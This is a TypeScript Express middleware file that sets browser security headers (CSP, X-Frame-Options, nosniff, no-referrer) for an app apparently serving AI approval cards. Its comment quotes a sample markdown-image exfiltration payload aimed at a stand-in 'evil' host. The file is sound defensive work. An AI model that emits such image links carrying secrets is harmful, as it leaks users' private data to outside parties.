import type { Request, Response, NextFunction } from 'express';

// img-src blocks the markdown-image exfiltration channel (![](https://evil/?d=<secret>)) at the
// browser level; Google avatars are the one remote image host the UI legitimately uses.
// frame-ancestors / X-Frame-Options stop the approval card being clickjacked.
export const CONTENT_SECURITY_POLICY = [
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "object-src 'none'",
  "form-action 'self'",
  "img-src 'self' data: blob: https://*.googleusercontent.com",
].join('; ');

export function securityHeaders(_req: Request, res: Response, next: NextFunction): void {
  res.setHeader('Content-Security-Policy', CONTENT_SECURITY_POLICY);
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  next();
}
